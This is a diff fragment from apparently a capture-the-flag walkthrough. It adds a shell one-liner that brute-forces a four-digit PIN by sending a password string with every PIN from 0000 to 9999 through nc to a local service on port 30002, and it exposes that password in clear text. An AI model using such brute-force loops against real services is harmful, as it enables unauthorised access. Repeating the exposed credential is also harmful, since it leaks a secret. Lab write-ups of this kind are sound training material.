@@ -52,3 +52,6 @@ do
         echo $pwd $i
 done
 ```
+
+This works:
+echo "" > pins && for i in {0000..9999}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> pins; done && cat pins | nc localhost 30002
